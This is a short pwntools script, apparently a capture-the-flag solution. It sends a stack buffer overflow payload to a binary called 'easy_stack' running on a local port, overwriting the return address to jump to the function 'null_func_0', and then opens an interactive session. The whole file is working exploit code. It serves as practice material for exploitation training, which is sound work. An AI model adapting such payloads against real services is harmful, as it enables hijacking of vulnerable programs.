from pwn import *

elf=ELF('./easy_stack')
p=remote('127.0.0.1',9997)
context.terminal=['gnome-terminal','-x','sh','-c']
# p=process('./easy_stack')
# p=gdb.debug('./easy_stack')

tar=elf.sym['null_func_0']
print(b'a'*0x30+p64(0)+p64(tar))
p.send(b'a'*0x30+p64(0)+p64(tar))
p.interactive()